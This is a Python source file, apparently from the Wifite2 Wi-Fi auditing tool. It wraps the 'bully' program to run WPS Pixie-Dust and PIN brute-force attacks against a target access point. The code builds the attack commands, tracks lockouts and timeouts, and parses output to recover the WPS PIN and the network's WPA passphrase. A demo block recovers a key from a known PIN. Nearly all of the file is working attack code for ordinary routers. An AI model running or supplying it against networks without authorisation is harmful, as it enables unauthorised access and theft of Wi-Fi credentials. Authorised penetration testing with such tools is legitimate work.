#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from .dependency import Dependency
from .airodump import Airodump
from ..model.attack import Attack
from ..model.wps_result import CrackResultWPS
from ..util.color import Color
from ..util.timer import Timer
from ..util.process import Process
from ..config import Configuration

import os, time, re
from threading import Thread

class Bully(Attack, Dependency):
    dependency_required = False
    dependency_name = 'bully'
    dependency_url = 'https://github.com/aanarchyy/bully'

    def __init__(self, target):
        super(Bully, self).__init__(target)
        self.total_timeouts = 0
        self.total_failures = 0
        self.locked = False
        self.state = "{O}Waiting for beacon{W}"
        self.start_time = time.time()

        self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
        self.crack_result = None

        self.target = target

        self.cmd = []

        if Process.exists('stdbuf'):
            self.cmd.extend([
                "stdbuf", "-o0" # No buffer. See https://stackoverflow.com/a/40453613/7510292
            ])

        self.cmd.extend([
            "bully",
            "--bssid", target.bssid,
            "--channel", target.channel,
            "--detectlock", # Detect WPS lockouts unreported by AP
            "--force",
            "-v", "4",
            "--pixiewps",
            Configuration.interface
        ])

        self.bully_proc = None


    def run(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wps_pin') as airodump:
            # Wait for target
            self.pattack("Waiting for target to appear...")
            self.target = self.wait_for_target(airodump)

            # Start bully
            self.bully_proc = Process(self.cmd,
                stderr=Process.devnull(),
                bufsize=0,
                cwd=Configuration.temp())

            # Start bully status thread
            t = Thread(target=self.parse_line_thread)
            t.daemon = True
            t.start()

            try:
                while self.bully_proc.poll() is None:
                    try:
                        self.target = self.wait_for_target(airodump)
                    except Exception as e:
                        self.pattack('{R}Failed: {O}%s{W}' % e, newline=True)
                        self.stop()
                        break

                    # Update status
                    self.pattack(self.get_status())

                    # Check if entire attack timed out.
                    if self.running_time() > Configuration.wps_pixie_timeout:
                        self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % Configuration.wps_pixie_timeout, newline=True)
                        self.stop()
                        return

                    # Check if timeout threshold was breached
                    if self.total_timeouts >= Configuration.wps_timeout_threshold:
                        self.pattack('{R}Failed: {O}More than %d timeouts{W}' % Configuration.wps_timeout_threshold, newline=True)
                        self.stop()
                        return

                    # Check if WPSFail threshold was breached
                    if self.total_failures >= Configuration.wps_fail_threshold:
                        self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % Configuration.wps_fail_threshold, newline=True)
                        self.stop()
                        return

                    time.sleep(0.5)
            except KeyboardInterrupt as e:
                self.stop()
                raise e
            except Exception as e:
                self.stop()
                raise e

        if self.crack_result is None:
            self.pattack("{R}Failed{W}", newline=True)


    def pattack(self, message, newline=False):
        # Print message with attack information.
        time_left = Configuration.wps_pixie_timeout - self.running_time()

        Color.clear_entire_line()
        Color.pattack("WPS",
                self.target,
                'Pixie-Dust',
                '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
        if newline:
            Color.pl("")


    def running_time(self):
        return int(time.time() - self.start_time)


    def get_status(self):
        main_status = self.state

        meta_statuses = []
        if self.total_timeouts > 0:
            meta_statuses.append("{O}Timeouts:%d{W}" % self.total_timeouts)

        if self.total_failures > 0:
            meta_statuses.append("{O}WPSFail:%d{W}" % self.total_failures)

        if self.locked:
            meta_statuses.append("{R}Locked{W}")

        if len(meta_statuses) > 0:
            main_status += ' (%s)' % ', '.join(meta_statuses)

        return main_status


    def parse_line_thread(self):
        for line in iter(self.bully_proc.pid.stdout.readline, b""):
            if line == "": continue
            line = line.replace("\r", "").replace("\n", "").strip()

            if Configuration.verbose > 1:
                Color.pe('\n{P} [bully:stdout] %s' % line)
                
            self.state = self.parse_state(line)

            self.crack_result = self.parse_crack_result(line)

            if self.crack_result:
                break


    def parse_crack_result(self, line):
        # Check for line containing PIN and PSK
        # [*] Pin is '80246213', key is 'password'
        pin_key_re = re.search(r"Pin is '(\d*)', key is '(.*)'", line)
        if pin_key_re:
            self.cracked_pin = pin_key_re.group(1)
            self.cracked_key = pin_key_re.group(2)

        ###############
        # Check for PIN
        if self.cracked_pin is None:
            #        PIN   : '80246213'
            pin_re = re.search(r"^\s*PIN\s*:\s*'(.*)'\s*$", line)
            if pin_re:
                self.cracked_pin = pin_re.group(1)

            # [Pixie-Dust] PIN FOUND: 01030365
            pin_re = re.search(r"^\[Pixie-Dust\] PIN FOUND: '?(\d*)'?\s*$", line)
            if pin_re:
                self.cracked_pin = pin_re.group(1)

            if self.cracked_pin is not None:
                # Mention the PIN & that we're not done yet.
                self.pattack("{G}Cracked PIN: {C}%s{W}" % self.cracked_pin, newline=True)

                self.state = "{G}Finding PSK...{C}"
                time.sleep(2)

        ###########################
        #        KEY   : 'password'
        key_re = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line)
        if key_re:
            self.cracked_key = key_re.group(1)

        if not self.crack_result and self.cracked_pin and self.cracked_key:
            self.pattack("{G}Cracked PSK: {C}%s{W}" % self.cracked_key, newline=True)
            self.crack_result = CrackResultWPS(
                    self.target.bssid,
                    self.target.essid,
                    self.cracked_pin,
                    self.cracked_key)
            Color.pl("")
            self.crack_result.dump()

        return self.crack_result


    def parse_state(self, line):
        state = self.state

        # [+] Got beacon for 'Green House 5G' (30:85:a9:39:d2:1c)
        got_beacon = re.search(r".*Got beacon for '(.*)' \((.*)\)", line)
        if got_beacon:
            # group(1)=ESSID, group(2)=BSSID
            state = "Got beacon"

        # [+] Last State = 'NoAssoc'   Next pin '48855501'
        last_state = re.search(r".*Last State = '(.*)'\s*Next pin '(.*)'", line)
        if last_state:
            # group(1)=result, group(2)=PIN
            pin = last_state.group(2)
            state = "Trying PIN {C}%s{W} (%s)" % (pin, last_state.group(1))

        # [+] Tx( Auth ) = 'Timeout'   Next pin '80241263'
        mx_result_pin = re.search(r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'", line)
        if mx_result_pin:
            self.locked = False
            # group(1)=M3/M5, group(2)=result, group(3)=PIN
            m_state = mx_result_pin.group(1)
            result = mx_result_pin.group(2) # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
            pin = mx_result_pin.group(3)

            if result == "Timeout":
                self.total_timeouts += 1
                result = "{O}%s{W}" % result
            elif result == "WPSFail":
                self.total_failures += 1
                result = "{O}%s{W}" % result
            elif result == "NoAssoc":
                result = "{O}%s{W}" % result
            else:
                result = "{R}%s{W}" % result

            result = "{P}%s{W}:%s" % (m_state.strip(), result.strip())
            state = "Trying PIN {C}%s{W} (%s)" % (pin, result)

        # [!] WPS lockout reported, sleeping for 43 seconds ...
        re_lockout = re.search(r".*WPS lockout reported, sleeping for (\d+) seconds", line)
        if re_lockout:
            self.locked = True
            sleeping = re_lockout.group(1)
            state = "{R}WPS Lock-out: {O}Waiting %s seconds{W}" % sleeping

        # [Pixie-Dust] WPS pin not found
        re_pin_not_found = re.search(r".*\[Pixie-Dust\] WPS pin not found", line)
        if re_pin_not_found:
            state = "{R}Failed: {O}Bully says 'WPS pin not found'{W}"

        # [+] Running pixiewps with the information, wait ...
        re_running_pixiewps = re.search(r".*Running pixiewps with the information", line)
        if re_running_pixiewps:
            state = "{G}Running pixiewps...{W}"

        return state


    def stop(self):
        if hasattr(self, "pid") and self.pid and self.pid.poll() is None:
            self.pid.interrupt()


    def __del__(self):
        self.stop()


    @staticmethod
    def get_psk_from_pin(target, pin):
        # Fetches PSK from a Target assuming "pin" is the correct PIN
        '''
        bully --channel 1 --bssid 34:21:09:01:92:7C --pin 01030365 --bruteforce wlan0mon
        PIN   : '01030365'
        KEY   : 'password'
        BSSID : '34:21:09:01:92:7c'
        ESSID : 'AirLink89300'
        '''
        cmd = [
            'bully',
            '--channel', target.channel,
            '--bssid', target.bssid,
            '--pin', pin,
            '--bruteforce',
            '--force',
            Configuration.interface
        ]

        bully_proc = Process(cmd)

        for line in bully_proc.stderr().split('\n'):
            key_re = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line)
            if key_re is not None:
                psk = key_re.group(1)
                return psk

        return None


if __name__ == '__main__':
    Configuration.initialize()
    Configuration.interface = 'wlan0mon'
    from ..model.target import Target
    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
    target = Target(fields)
    psk = Bully.get_psk_from_pin(target, '01030365')
    print("psk", psk)

    '''
    stdout = " [*] Pin is '11867722', key is '9a6f7997'"
    Configuration.initialize(False)
    from ..model.target import Target
    fields = 'AA:BB:CC:DD:EE:FF,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,HOME-ABCD,'.split(',')
    target = Target(fields)
    b = Bully(target)
    b.parse_line(stdout)
    '''
